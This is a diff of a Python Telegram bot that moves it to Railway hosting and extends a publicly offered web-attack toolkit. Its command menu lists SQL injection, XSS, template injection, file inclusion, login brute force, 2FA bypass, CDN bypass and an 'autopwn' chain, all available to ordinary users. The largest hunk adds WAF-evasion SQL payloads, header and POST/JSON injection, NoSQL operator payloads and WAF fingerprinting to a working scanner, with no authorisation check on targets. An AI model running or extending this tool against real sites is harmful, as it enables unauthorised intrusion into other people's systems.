@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # ╔══════════════════════════════════════════════════════════════╗
-# ║     Website Downloader Bot  v28.0  — Quality Overhaul       ║
-# ║  ✅ All V26 features + Major Improvements                   ║
+# ║     Website Downloader Bot  v28.0  — Railway Edition        ║
+# ║  ✅ All V26/V27 features + Railway-optimized                ║
 # ║ ──────────────── v27 Improvements ────────────────────────  ║
 # ║  🔧 JSON export added: sqli/xss/paramfuzz/cloudcheck/      ║
 # ║     techstack/bruteforce/2fabypass/resetpwd/recon           ║
@@ -12,18 +12,17 @@
 # ║  🔧 /bruteforce: JSON body login support                    ║
 # ║  🔧 /autopwn: real-time phase progress display              ║
 # ║  🔧 51 silent except → proper error logging                 ║
+# ╠══════════════════════════════════════════════════════════════╣
+# ║  Railway Deployment:                                         ║
+# ║    Set environment variables in Railway dashboard:           ║
+# ║      BOT_TOKEN   = your telegram bot token                  ║
+# ║      ADMIN_IDS   = your telegram user id (comma separated)  ║
+# ║      DATA_DIR    = /app/data  (or mount a Railway volume)   ║
+# ║      SECRET_KEY  = (optional, auto-generated if not set)    ║
+# ║    Deploy: connect GitHub repo → Railway auto-deploys        ║
 # ╚══════════════════════════════════════════════════════════════╝
-#
-# Termux Setup:
-#   pkg update && pkg upgrade -y
-#   pkg install python nodejs -y
-#   pip install python-telegram-bot requests beautifulsoup4 python-dotenv
-#   npm install puppeteer
-#   cp .env.example .env   # ပြီးရင် .env ထဲ token ထည့်ပါ
-#   python web_downloader_bot.py
-# ══════════════════════════════════════════════════════════════
 
-import os, re, json, time, shutil, zipfile, hashlib, hmac, string, struct, tempfile
+import os, re, json, time, shutil, zipfile, hashlib, hmac, string, struct, tempfile, threading
 import logging, asyncio, subprocess, socket, random, difflib, functools, io
 from collections import defaultdict, deque
 from typing import Dict, List, Set, Tuple, Callable, Optional
@@ -56,19 +55,26 @@ except ImportError:
 # ══════════════════════════════════════════════════
 # ⚙️  CONFIG  —  .env မှ ယူသည် (fallback: hardcode)
 # ══════════════════════════════════════════════════
-BOT_TOKEN = os.getenv("BOT_TOKEN", "")  # Set in .env or environment variable
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")  # Set in Railway environment variables
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
 
 # ── Startup validation ──────────────────────────────────────────────────
 if not BOT_TOKEN:
-    raise SystemExit("❌ BOT_TOKEN not set! Add it to .env file or environment variables.")
+    raise SystemExit("❌ BOT_TOKEN not set! Add it to Railway environment variables.")
 if not ADMIN_IDS:
-    raise SystemExit("❌ ADMIN_IDS not set! Add your Telegram user ID to .env file.")
+    raise SystemExit("❌ ADMIN_IDS not set! Add your Telegram user ID to Railway environment variables.")
+
+# ── DATA_DIR: persistent storage root ──────────────────────────────────
+# Railway: mount a volume at /app/data for persistence across deploys
+# Without a volume, /app/data is ephemeral (wiped on redeploy) — still works fine
+DATA_DIR = os.getenv("DATA_DIR", "/app/data")
+os.makedirs(DATA_DIR, exist_ok=True)
 
 # ── SECRET_KEY: persistent across restarts (HMAC resume state integrity) ──
 # Bug fix: os.urandom() ကို တိုင်းသုံးရင် restart တိုင်း key ပြောင်းသွားတယ်
 # Fix: file ထဲ save ထားပြီး ဖတ်သုံးတယ် — resume HMAC ကို stable ဖြစ်စေသည်
-_SECRET_KEY_FILE = os.path.expanduser("~/downloads/secret.key")
+# Railway: SECRET_KEY env var set ထားရင် file မလိုဘဲ directly သုံးသည်
+_SECRET_KEY_FILE = os.path.join(DATA_DIR, "secret.key")
 
 def _load_or_create_secret_key() -> str:
     env_key = os.getenv("SECRET_KEY", "")
@@ -95,10 +101,10 @@ def _load_or_create_secret_key() -> str:
 
 SECRET_KEY = _load_or_create_secret_key()
 
-DOWNLOAD_DIR    = os.path.expanduser("~/downloads/web_sources")
-DB_FILE         = os.path.expanduser("~/downloads/bot_db.json")
-RESUME_DIR      = os.path.expanduser("~/downloads/resume_states")
-APP_ANALYZE_DIR = os.path.expanduser("~/downloads/app_analysis")
+DOWNLOAD_DIR    = os.path.join(DATA_DIR, "web_sources")
+DB_FILE         = os.path.join(DATA_DIR, "bot_db.json")
+RESUME_DIR      = os.path.join(DATA_DIR, "resume_states")
+APP_ANALYZE_DIR = os.path.join(DATA_DIR, "app_analysis")
 APP_MAX_MB      = int(os.getenv("APP_MAX_MB", "150"))   # max upload size
 JS_RENDER       = os.path.join(os.path.dirname(os.path.abspath(__file__)), "js_render.js")
 
@@ -121,7 +127,7 @@ logger = logging.getLogger(__name__)
 # ── File log with rotation (5MB × 3 files — disk ပြည့်မသွားဖို့) ───
 from logging.handlers import RotatingFileHandler
 _file_handler = RotatingFileHandler(
-    os.path.expanduser("~/downloads/bot.log"),
+    os.path.join(DATA_DIR, "bot.log"),
     maxBytes=5 * 1024 * 1024,   # 5MB per file
     backupCount=3,               # bot.log, bot.log.1, bot.log.2, bot.log.3
     encoding="utf-8"
@@ -9451,7 +9457,7 @@ async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.args and context.args[0].isdigit():
         n = min(int(context.args[0]), 100)
 
-    log_path = os.path.expanduser("~/downloads/bot.log")
+    log_path = os.path.join(DATA_DIR, "bot.log")
     if not os.path.exists(log_path):
         await update.effective_message.reply_text("📭 bot.log မရှိသေးပါ")
         return
@@ -9514,9 +9520,9 @@ async def cmd_disk(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             pass
             info[name] = {"size_mb": total_size / 1024 / 1024, "count": file_count}
 
-        # Disk usage (home dir)
+        # Disk usage (data dir)
         try:
-            st = shutil.disk_usage(os.path.expanduser("~"))
+            st = shutil.disk_usage(DATA_DIR)
             info["disk"] = {
                 "total_gb": st.total / 1024**3,
                 "used_gb":  st.used  / 1024**3,
@@ -9527,7 +9533,7 @@ async def cmd_disk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             info["disk"] = None
 
         # Log file size
-        log_p = os.path.expanduser("~/downloads/bot.log")
+        log_p = os.path.join(DATA_DIR, "bot.log")
         info["log_mb"] = os.path.getsize(log_p) / 1024 / 1024 if os.path.exists(log_p) else 0
 
         return info
@@ -10328,13 +10334,13 @@ def main():
         print("═"*55)
         return
 
-    # ── Build app with extended timeouts for Termux ───
+    # ── Build app with Railway-optimized timeouts ─────
     request = HTTPXRequest(
-        connection_pool_size   = 8,
-        connect_timeout        = 30.0,
+        connection_pool_size   = 16,   # Railway stable network → higher pool
+        connect_timeout        = 20.0,
         read_timeout           = 30.0,
         write_timeout          = 30.0,
-        pool_timeout           = 30.0,
+        pool_timeout           = 20.0,
     )
     app = (
         Application.builder()
@@ -10413,6 +10419,11 @@ def main():
     app.add_handler(CommandHandler("resetpwd",   cmd_resetpwd))
     app.add_handler(CommandHandler("sourcemap",  cmd_sourcemap))
     app.add_handler(CommandHandler("gitexposed", cmd_gitexposed))
+    # ── v28.1 New Scanners ────────────────────────
+    app.add_handler(CommandHandler("ssti",         cmd_ssti))
+    app.add_handler(CommandHandler("cors",         cmd_cors))
+    app.add_handler(CommandHandler("openredirect", cmd_openredirect))
+    app.add_handler(CommandHandler("lfi",          cmd_lfi))
 
     # ── Callbacks ─────────────────────────────────
     app.add_handler(CallbackQueryHandler(force_join_callback,    pattern="^fj_check$"))
@@ -10431,26 +10442,24 @@ def main():
     app.add_error_handler(error_handler)
 
     print("╔══════════════════════════════════════════╗")
-    print("║  Website Downloader Bot v28.0            ║")
-    print(f"║  Commands: 18 → 25 (v20 +7 new)         ║")
-    print(f"║  /techstack← Deep tech fingerprint       ║")
-    print(f"║  /sqli     ← SQL Injection tester        ║")
-    print(f"║  /xss      ← XSS scanner                 ║")
-    print(f"║  /cloudcheck← Real IP / CDN bypass       ║")
-    print(f"║  /paramfuzz← Advanced param fuzzer       ║")
-    print(f"║  /autopwn  ← Full auto pentest chain     ║")
-    print(f"║  /bulkscan ← Bulk URL scanner             ║")
+    print("║  Website Downloader Bot v28.1 Railway    ║")
+    print(f"║  /sqli     ← SQL Injection (GET/POST/Hdr)║")
+    print(f"║  /xss      ← XSS (Reflected/Form/Header) ║")
+    print(f"║  /ssti     ← Template Injection (NEW)    ║")
+    print(f"║  /cors     ← CORS Misconfig (NEW)        ║")
+    print(f"║  /openredirect← Open Redirect (NEW)      ║")
+    print(f"║  /lfi      ← File Inclusion (NEW)        ║")
     print(f"║  ─────────────────────────────────────── ║")
     print(f"║  SSRF + Path Traversal: ✅               ║")
     print(f"║  SECRET_KEY persistent: ✅               ║")
     print(f"║  Log Rotation 5MB×3:    ✅               ║")
     print(f"║  Rate Limit: ✅ ({RATE_LIMIT_SEC}s)              ║")
-    print(f"║  JS Puppeteer: {'✅' if PUPPETEER_OK else '❌ npm install puppeteer'}              ║")
+    print(f"║  JS Puppeteer: {'✅' if PUPPETEER_OK else '❌ (optional)'}                        ║")
     print("╚══════════════════════════════════════════╝")
 
     # ── Bug fix: _start_background defined OUTSIDE retry loop ──
     async def _start_background(application):
-        """Background tasks — queue worker + auto-delete loop + monitor loop"""
+        """Background tasks + set bot command list"""
         global _monitor_app_ref
         _monitor_app_ref = application
         asyncio.create_task(queue_worker())
@@ -10458,9 +10467,94 @@ def main():
         asyncio.create_task(monitor_loop())
         logger.info("Background tasks started (queue worker + auto-delete + monitor)")
 
+        # ── Register bot commands (Telegram "/" menu) ──────────────────
+        from telegram import BotCommand, BotCommandScopeDefault, BotCommandScopeChat
+
+        # ── User commands (all users မြင်ရ) ────────────────────────────
+        user_commands = [
+            BotCommand("start",        "🚀 Bot စတင်ရန်"),
+            BotCommand("help",         "📚 Commands အားလုံးကြည့်ရန်"),
+            BotCommand("dl",           "📥 Website download"),
+            BotCommand("scan",         "🔍 Security scan"),
+            BotCommand("recon",        "🌐 Reconnaissance"),
+            BotCommand("discover",     "🔎 Subdomain / API discovery"),
+            BotCommand("techstack",    "🔬 Tech fingerprint"),
+            BotCommand("sqli",         "💉 SQL Injection test"),
+            BotCommand("xss",          "🎯 XSS scanner"),
+            BotCommand("ssti",         "🔥 Template injection"),
+            BotCommand("cors",         "🌐 CORS misconfiguration"),
+            BotCommand("openredirect", "🔀 Open redirect scan"),
+            BotCommand("lfi",          "📂 File inclusion scan"),
+            BotCommand("cloudcheck",   "☁️ Real IP / CDN bypass"),
+            BotCommand("paramfuzz",    "🧪 Parameter fuzzer"),
+            BotCommand("autopwn",      "⚡ Auto pentest chain"),
+            BotCommand("bruteforce",   "🔑 Login brute force"),
+            BotCommand("2fabypass",    "🔓 2FA bypass test"),
+            BotCommand("resetpwd",     "🔒 Password reset test"),
+            BotCommand("gitexposed",   "📁 Git exposure finder"),
+            BotCommand("sourcemap",    "🗺️ Source map extractor"),
+            BotCommand("jwtattack",    "🔐 JWT attack"),
+            BotCommand("screenshot",   "📸 Website screenshot"),
+            BotCommand("monitor",      "👁️ Website monitor"),
+            BotCommand("bulkscan",     "📋 Bulk URL scan"),
+            BotCommand("appassets",    "📦 App asset analyzer"),
+            BotCommand("antibot",      "🤖 Anti-bot bypass"),
+            BotCommand("history",      "📜 Download history"),
+            BotCommand("mystats",      "📊 My stats"),
+            BotCommand("status",       "ℹ️ Bot status"),
+            BotCommand("stop",         "🛑 Stop current scan"),
+            BotCommand("resume",       "▶️ Resume download"),
+        ]
+
+        # ── Admin commands (Admin IDs သာ မြင်ရ) ─────────────────────────
+        admin_commands = user_commands + [
+            BotCommand("admin",       "🛠️ Admin panel"),
+            BotCommand("ban",         "🚫 User ban"),
+            BotCommand("unban",       "✅ User unban"),
+            BotCommand("userinfo",    "👤 User info"),
+            BotCommand("broadcast",   "📢 Broadcast message"),
+            BotCommand("allusers",    "👥 All users list"),
+            BotCommand("setforcejoin","📌 Set force join"),
+            BotCommand("sys",         "🖥️ System logs/disk"),
+            BotCommand("adminset",    "⚙️ Bot settings"),
+        ]
+
+        try:
+            # Default scope — user commands (everyone)
+            await application.bot.set_my_commands(
+                user_commands,
+                scope=BotCommandScopeDefault()
+            )
+
+            # Per-admin scope — admin commands (only admins)
+            for admin_id in ADMIN_IDS:
+                try:
+                    await application.bot.set_my_commands(
+                        admin_commands,
+                        scope=BotCommandScopeChat(chat_id=admin_id)
+                    )
+                except Exception as e:
+                    logger.warning("set_my_commands for admin %d failed: %s", admin_id, e)
+
+            logger.info("Bot commands registered: %d user + %d admin-only",
+                        len(user_commands), len(admin_commands) - len(user_commands))
+        except Exception as e:
+            logger.warning("set_my_commands failed: %s", e)
+
     app.post_init = _start_background
 
-    # ── Retry loop — Termux network drop ကို handle ──
+    # ── SIGTERM handler — Railway graceful shutdown ────
+    import signal
+    _shutdown_event = asyncio.Event() if False else None  # placeholder
+
+    def _handle_sigterm(*_):
+        logger.info("SIGTERM received — shutting down gracefully...")
+        print("\n🛑 SIGTERM received — shutting down...")
+        raise KeyboardInterrupt
+
+    signal.signal(signal.SIGTERM, _handle_sigterm)
+
+    # ── Retry loop — Network error recovery ───────────
     MAX_RETRIES = 10
     RETRY_DELAY = 10   # seconds
 
@@ -10471,8 +10565,8 @@ def main():
             app.run_polling(
                 allowed_updates = Update.ALL_TYPES,
                 drop_pending_updates = True,
-                timeout          = 20,
-                poll_interval    = 0.5,
+                timeout          = 30,
+                poll_interval    = 0.3,
             )
             break  # clean exit
         except TimedOut as e:
@@ -10853,19 +10947,63 @@ async def cmd_techstack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 _SQLI_ERRORS = {
     "MySQL":      [r"you have an error in your sql syntax",
                    r"warning.*mysql_", r"mysql_num_rows",
-                   r"supplied argument is not a valid mysql", r"mysql\.err"],
+                   r"supplied argument is not a valid mysql", r"mysql\.err",
+                   r"com\.mysql\.jdbc", r"root@localhost", r"mysql_fetch_array",
+                   r"mysql_connect\(\)", r"mysql server version for the right",
+                   r"error.*in your sql syntax", r"mysql_query\(\)"],
     "PostgreSQL": [r"pg_query\(\)", r"pgsqlquery", r"postgresql.*error",
-                   r"warning.*pg_", r"valid postgresql result"],
+                   r"warning.*pg_", r"valid postgresql result",
+                   r"psql.*error", r"pg_exec\(\)", r"unterminated quoted string",
+                   r"invalid input syntax for", r"column.*does not exist",
+                   r"relation.*does not exist"],
     "MSSQL":      [r"microsoft.*odbc.*sql server", r"odbc sql server driver",
-                   r"sqlsrv_query", r"mssql_query", r"unclosed quotation mark"],
+                   r"sqlsrv_query", r"mssql_query", r"unclosed quotation mark",
+                   r"microsoft.*ole db.*sql server", r"mssql_execute",
+                   r"sqlstate.*42000", r"incorrect syntax near",
+                   r"conversion failed when converting"],
     "Oracle":     [r"ora-[0-9]{5}", r"oracle error", r"oracle.*driver",
-                   r"quoted string not properly terminated"],
+                   r"quoted string not properly terminated",
+                   r"oci_parse\(\)", r"oci_execute\(\)", r"oracle\.jdbc"],
     "SQLite":     [r"sqlite.*error", r"sqlite3\.operationalerror",
-                   r"near.*syntax error", r"sqliteexception"],
+                   r"near.*syntax error", r"sqliteexception",
+                   r"no such column", r"no such table"],
+    "IBM DB2":    [r"CLI Driver.*DB2", r"db2_execute", r"db2_query",
+                   r"SQLSTATE.*42", r"com\.ibm\.db2"],
+    "Sybase":     [r"sybase.*error", r"com\.sybase\.jdbc",
+                   r"sybase.adaptive", r"ASA Error"],
+    "NoSQL":      [r"mongoerror", r"mongodb.*exception",
+                   r"CastError.*ObjectId", r"E11000 duplicate key"],
     "Generic":    [r"sql syntax.*near", r"syntax error.*in query expression",
                    r"data source name not found", r"\[microsoft\]\[odbc",
-                   r"invalid.*argument.*supplied.*sql", r"error in your sql"],
+                   r"invalid.*argument.*supplied.*sql", r"error in your sql",
+                   r"PDOException.*SQLSTATE", r"Zend_Db.*Exception"],
 }
+
+# ── WAF Evasion payloads (appended to basic list at runtime) ─────────
+_SQLI_WAF_BYPASS = [
+    "' /*!50000OR*/ '1'='1'--",
+    "' OR/**/'1'='1'--",
+    "'%09OR%091=1--",
+    "' OR 0x31=0x31--",
+    "' OR CHAR(49)=CHAR(49)--",
+    "' oR '1'='1",
+    "1' AnD 1=1--",
+    "1'/**/AND/**/1=1--",
+    "1' AND 0x31=0x31--",
+    "1+AND+1=1",
+    "%27+OR+%271%27=%271",
+]
+
+# ── Header injection targets ─────────────────────────────────────────
+_SQLI_HEADERS_TO_TEST = [
+    "X-Forwarded-For",
+    "X-Real-IP",
+    "Referer",
+    "User-Agent",
+    "X-Custom-IP-Authorization",
+    "X-Originating-IP",
+    "Cookie",
+]
 
 # ── Scan result cache (5min TTL) ──────────────────────────────
 _scan_cache: dict = {}   # {cache_key: (timestamp, result)}
@@ -10990,21 +11128,25 @@ _SQLI_PAYLOADS_BLIND = [
 ]
 
 def _sqli_scan_sync(url: str, progress_q: list) -> dict:
-    """SQL Injection scanner — error-based + boolean + time-based."""
+    """SQL Injection scanner — error + boolean + time + POST + header injection + WAF bypass."""
     results = {
-        "error_based": [],
+        "error_based":   [],
         "boolean_based": [],
-        "time_based": [],
+        "time_based":    [],
+        "post_based":    [],
+        "header_based":  [],
+        "nosql_based":   [],
         "params_tested": [],
-        "db_type": "Unknown",
-        "total_found": 0,
+        "db_type":       "Unknown",
+        "total_found":   0,
+        "waf_detected":  False,
     }
 
     parsed = urlparse(url)
     params_raw = parsed.query
     base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
 
-    # ── Collect parameters ─────────────────────────
+    # ── Collect GET parameters ──────────────────────
     params = {}
     if params_raw:
         for part in params_raw.split("&"):
@@ -11012,120 +11154,212 @@ def _sqli_scan_sync(url: str, progress_q: list) -> dict:
                 k, v = part.split("=", 1)
                 params[k] = v
 
-    # Also test common params if URL has none
-    # ✅ Bug #3 Fix: Root URL ဆိုရင် common params အနည်းငယ်သာ test (+warning)
+    # Fallback: common params if URL has none
     if not params:
         common_params = ["id", "page", "cat", "product", "search",
                          "q", "query", "user", "username", "item",
                          "view", "type", "pid", "cid", "uid", "sid"]
-        params = {p: "1" for p in common_params[:5]}   # 8 → 5 (speed)
-        results["_no_params_in_url"] = True            # flag for false+ warning
+        params = {p: "1" for p in common_params[:5]}
+        results["_no_params_in_url"] = True
 
     results["params_tested"] = list(params.keys())
     progress_q.append(f"🔍 Testing `{len(params)}` params: `{'`, `'.join(list(params.keys())[:6])}`")
 
-    def _test_error(param, payload):
-        try:
-            test_params = dict(params)
-            test_params[param] = payload
-            r = requests.get(base_url, params=test_params, headers=_get_headers(),
-                             timeout=10, verify=False)
-            body = r.text.lower()
-            for db_type, patterns in _SQLI_ERRORS.items():
-                for pat in patterns:
-                    if re.search(pat, body, re.I):
-                        return db_type, pat
-        except Exception as _e:
-            logging.debug("Scan error: %s", _e)
+    # ── Shared session ─────────────────────────────
+    session = requests.Session()
+    session.headers.update(_get_headers())
+    session.verify = False
+
+    def _check_error(body: str) -> tuple:
+        body_l = body.lower()
+        for db_type, patterns in _SQLI_ERRORS.items():
+            for pat in patterns:
+                if re.search(pat, body_l, re.I):
+                    return db_type, pat
         return None, None
 
-    def _test_time(param, payload, expected_delay):
-        """Triple-confirm time-based SQLi to eliminate false positives."""
+    def _test_error_get(param, payload):
         try:
-            # ── Baseline: measure normal response time ──
-            baseline_times = []
-            for _ in range(2):
-                t0 = time.time()
-                requests.get(base_url, params=dict(params), headers=_get_headers(),
-                             timeout=10, verify=False)
-                baseline_times.append(time.time() - t0)
-            baseline_avg = sum(baseline_times) / len(baseline_times)
-
-            # ── Test with payload ──
             test_params = dict(params)
             test_params[param] = payload
-            t0 = time.time()
-            requests.get(base_url, params=test_params, headers=_get_headers(),
-                        timeout=expected_delay + 8, verify=False)
-            elapsed = time.time() - t0
-
-            # Must be significantly longer than baseline AND close to expected delay
-            delay_delta = elapsed - baseline_avg
-            if delay_delta >= (expected_delay * 0.8):   # 80% of expected delay above baseline
-                # ── Confirm once more to avoid fluke ──
-                t1 = time.time()
-                requests.get(base_url, params=test_params, headers=_get_headers(),
-                            timeout=expected_delay + 8, verify=False)
-                elapsed2 = time.time() - t1
-                delta2 = elapsed2 - baseline_avg
-                if delta2 >= (expected_delay * 0.7):    # both runs must confirm
-                    return True, round((elapsed + elapsed2) / 2, 2)
-        except requests.Timeout:
-            return True, expected_delay
+            r = session.get(base_url, params=test_params, timeout=10)
+            return _check_error(r.text)
         except Exception as _e:
-            logging.debug("Scan error: %s", _e)
-        return False, 0
+            logging.debug("SQLi GET error: %s", _e)
+        return None, None
+
+    def _test_error_post(param, payload):
+        """Test SQLi via POST body (form-data + JSON)"""
+        try:
+            post_data = dict(params)
+            post_data[param] = payload
+            # Try form-data first
+            r = session.post(base_url, data=post_data, timeout=10)
+            db, pat = _check_error(r.text)
+            if db: return db, pat
+            # Try JSON body
+            r2 = session.post(base_url, json=post_data,
+                              headers={**_get_headers(), "Content-Type": "application/json"},
+                              timeout=10)
+            return _check_error(r2.text)
+        except Exception as _e:
+            logging.debug("SQLi POST error: %s", _e)
+        return None, None
+
+    def _test_header_injection(header_name, payload):
+        """Inject SQLi payload into HTTP headers"""
+        try:
+            inj_headers = dict(_get_headers())
+            inj_headers[header_name] = payload
+            r = session.get(base_url, headers=inj_headers, timeout=10)
+            return _check_error(r.text)
+        except Exception as _e:
+            logging.debug("SQLi header error: %s", _e)
+        return None, None
 
     def _test_boolean(param, true_pay, false_pay):
         try:
-            test_params_t = dict(params)
-            test_params_t[param] = true_pay
-            test_params_f = dict(params)
-            test_params_f[param] = false_pay
-            r_true  = requests.get(base_url, params=test_params_t, headers=_get_headers(), timeout=8, verify=False)
-            r_false = requests.get(base_url, params=test_params_f, headers=_get_headers(), timeout=8, verify=False)
-            len_diff = abs(len(r_true.text) - len(r_false.text))
-            if len_diff > 50:
-                return True, len_diff
+            p_t = dict(params); p_t[param] = true_pay
+            p_f = dict(params); p_f[param] = false_pay
+            r_t = session.get(base_url, params=p_t, timeout=8)
+            r_f = session.get(base_url, params=p_f, timeout=8)
+            diff = abs(len(r_t.text) - len(r_f.text))
+            # Use difflib ratio for more reliable boolean detection
+            similarity = difflib.SequenceMatcher(None, r_t.text[:2000], r_f.text[:2000]).ratio()
+            if diff > 50 and similarity < 0.97:
+                return True, diff
         except Exception as _e:
-            logging.debug("Scan error: %s", _e)
+            logging.debug("SQLi bool error: %s", _e)
         return False, 0
 
-    # ── Phase 1: Error-based ───────────────────────
-    progress_q.append("🧪 Phase 1: Error-based SQLi testing...")
+    def _test_nosql(param):
+        """Test NoSQL injection (MongoDB-style)"""
+        nosql_payloads = [
+            {"$gt": ""},
+            {"$ne": "invalid_xyz"},
+            {"$regex": ".*"},
+            {"$where": "1==1"},
+        ]
+        try:
+            for payload in nosql_payloads:
+                post_data = dict(params)
+                post_data[param] = payload
+                r = session.post(base_url, json={param: payload}, timeout=8)
+                if r.status_code == 200 and len(r.text) > 100:
+                    # Check if response differs from baseline (invalid input)
+                    baseline = session.post(base_url,
+                                            json={param: "invalid_xyz_nosql_test"},
+                                            timeout=8)
+                    if abs(len(r.text) - len(baseline.text)) > 100:
+                        return True, str(payload)
+        except Exception as _e:
+            logging.debug("NoSQL error: %s", _e)
+        return False, None
+
+    # ── WAF detection ──────────────────────────────
+    def _detect_waf():
+        try:
+            waf_probe = session.get(base_url,
+                params={"id": "1' OR '1'='1"}, timeout=8)
+            waf_sigs = ["cloudflare", "incapsula", "sucuri", "modsecurity",
+                        "barracuda", "f5 big-ip", "imperva", "403 forbidden",
+                        "access denied", "request blocked"]
+            body_l = waf_probe.text.lower()
+            if waf_probe.status_code in (403, 406, 501, 999) or \
+               any(s in body_l for s in waf_sigs):
+                return True
+        except Exception:
+            pass
+        return False
+
+    # ── Phase 0: WAF Detection ─────────────────────
+    progress_q.append("🛡️ Phase 0: WAF detection...")
+    results["waf_detected"] = _detect_waf()
+    if results["waf_detected"]:
+        progress_q.append("⚠️ WAF detected — switching to evasion payloads")
+
+    payload_set = _SQLI_PAYLOADS_BASIC[:]
+    if results["waf_detected"]:
+        payload_set = _SQLI_WAF_BYPASS + payload_set
+
+    # ── Phase 1: Error-based (GET parallel) ────────
+    progress_q.append("🧪 Phase 1: Error-based SQLi (GET + POST)...")
     found_error = False
-    for param in list(params.keys())[:5]:
-        for payload in _SQLI_PAYLOADS_BASIC[:8]:
-            db_type, pattern = _test_error(param, payload)
-            if db_type:
-                entry = {"param": param, "payload": payload,
-                         "db_type": db_type, "pattern": pattern}
-                results["error_based"].append(entry)
+
+    def _phase1_worker(args):
+        param, payload = args
+        return param, payload, *_test_error_get(param, payload)
+
+    param_payload_pairs = [
+        (p, pl)
+        for p in list(params.keys())[:6]
+        for pl in payload_set[:12]
+    ]
+    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
+        for param, payload, db_type, pattern in ex.map(_phase1_worker, param_payload_pairs):
+            if db_type and not found_error:
+                results["error_based"].append({
+                    "param": param, "payload": payload,
+                    "db_type": db_type, "pattern": pattern, "method": "GET"
+                })
                 results["db_type"] = db_type
                 found_error = True
-                progress_q.append(f"🔴 Error SQLi found! Param: `{param}` | DB: `{db_type}`")
+                progress_q.append(f"🔴 Error SQLi! Param: `{param}` | DB: `{db_type}` | GET")
+
+    # Phase 1b: POST body testing
+    if not found_error:
+        progress_q.append("🧪 Phase 1b: POST body injection testing...")
+        for param in list(params.keys())[:4]:
+            for payload in payload_set[:10]:
+                db_type, pattern = _test_error_post(param, payload)
+                if db_type:
+                    results["post_based"].append({
+                        "param": param, "payload": payload,
+                        "db_type": db_type, "method": "POST"
+                    })
+                    results["db_type"] = db_type
+                    found_error = True
+                    progress_q.append(f"🔴 POST SQLi! Param: `{param}` | DB: `{db_type}`")
+                    break
+            if found_error:
                 break
-        if found_error:
-            break
+
+    # ── Phase 1c: Header injection ─────────────────
+    progress_q.append("🧪 Phase 1c: HTTP header injection testing...")
+    for header in _SQLI_HEADERS_TO_TEST[:5]:
+        for payload in ["' OR '1'='1'--", "1' AND SLEEP(0)--", "' OR 1=1#"]:
+            db_type, pattern = _test_header_injection(header, payload)
+            if db_type:
+                results["header_based"].append({
+                    "header": header, "payload": payload,
+                    "db_type": db_type
+                })
+                results["db_type"] = db_type
+                progress_q.append(f"🔴 Header SQLi! Header: `{header}` | DB: `{db_type}`")
+                break
 
     # ── Phase 2: Boolean-based ─────────────────────
     progress_q.append("🧪 Phase 2: Boolean-based SQLi testing...")
+    bool_pairs = [
+        ("1' AND '1'='1", "1' AND '1'='2"),
+        ("1 AND 1=1",     "1 AND 1=2"),
+        ("1' AND 1=1--",  "1' AND 1=2--"),
+        ("1' AND 1=(SELECT 1)--", "1' AND 1=(SELECT 2)--"),
+    ]
     for param in list(params.keys())[:5]:
-        detected, diff = _test_boolean(param, "1' AND '1'='1", "1' AND '1'='2")
-        if detected:
-            results["boolean_based"].append({
-                "param": param, "content_diff": diff,
-                "true_payload": "1' AND '1'='1",
-                "false_payload": "1' AND '1'='2"
-            })
-            progress_q.append(f"🟠 Boolean SQLi found! Param: `{param}` | Diff: `{diff}` bytes")
-            break
+        for true_p, false_p in bool_pairs:
+            detected, diff = _test_boolean(param, true_p, false_p)
+            if detected:
+                results["boolean_based"].append({
+                    "param": param, "content_diff": diff,
+                    "true_payload": true_p, "false_payload": false_p
+                })
+                progress_q.append(f"🟠 Boolean SQLi! Param: `{param}` | Diff: `{diff}` bytes")
+                break
 
-    # ── Phase 3: Time-based ────────────────────────
-    # ✅ Bug #2 Fix: Baseline တစ်ကြိမ်သာ တိုင်းပြီး cache ထားတယ်
-    # Param တစ်ခုမှာ hit ရရင် ထပ်မထပ် — early exit
+    # ── Phase 3: Time-based blind ──────────────────
     progress_q.append("🧪 Phase 3: Time-based blind SQLi testing...")
-    _baseline_cache: dict = {}   # {param: baseline_avg}
+    _baseline_cache: dict = {}
 
     def _get_baseline(param):
         if param not in _baseline_cache:
@@ -11133,8 +11367,7 @@ def _sqli_scan_sync(url: str, progress_q: list) -> dict:
             for _ in range(2):
                 t0 = time.time()
                 try:
-                    requests.get(base_url, params=dict(params),
-                                 headers=_get_headers(), timeout=10, verify=False)
+                    session.get(base_url, params=dict(params), timeout=10)
                 except Exception:
                     pass
                 times.append(time.time() - t0)
@@ -11153,15 +11386,11 @@ def _sqli_scan_sync(url: str, progress_q: list) -> dict:
                 test_params = dict(params)
                 test_params[param] = payload
                 t0 = time.time()
-                requests.get(base_url, params=test_params, headers=_get_headers(),
-                             timeout=delay + 8, verify=False)
+                session.get(base_url, params=test_params, timeout=delay + 8)
                 elapsed = time.time() - t0
-                delay_delta = elapsed - baseline_avg
-                if delay_delta >= (delay * 0.8):
-                    # Single confirm run (was 2 — now 1 to cut requests)
+                if elapsed - baseline_avg >= (delay * 0.8):
                     t1 = time.time()
-                    requests.get(base_url, params=test_params, headers=_get_headers(),
-                                 timeout=delay + 8, verify=False)
+                    session.get(base_url, params=test_params, timeout=delay + 8)
                     elapsed2 = time.time() - t1
                     if (elapsed2 - baseline_avg) >= (delay * 0.7):
                         avg_elapsed = round((elapsed + elapsed2) / 2, 2)
@@ -11170,24 +11399,35 @@ def _sqli_scan_sync(url: str, progress_q: list) -> dict:
                             "elapsed_sec": avg_elapsed, "expected_sec": delay
                         })
                         progress_q.append(
-                            f"🔴 Time-based SQLi! Param: `{param}` | Delay: `{avg_elapsed:.1f}s`")
+                            f"🔴 Time SQLi! Param: `{param}` | Delay: `{avg_elapsed:.1f}s`")
                         time_found_params.add(param)
-                        break   # ✅ found on this param — next param
+                        break
             except requests.Timeout:
                 results["time_based"].append({
                     "param": param, "payload": payload,
                     "elapsed_sec": delay, "expected_sec": delay
                 })
                 progress_q.append(
-                    f"🔴 Time-based SQLi (Timeout)! Param: `{param}` | Delay: `{delay}s`")
+                    f"🔴 Time SQLi (Timeout)! Param: `{param}` | Delay: `{delay}s`")
                 time_found_params.add(param)
                 break
             except Exception:
                 pass
 
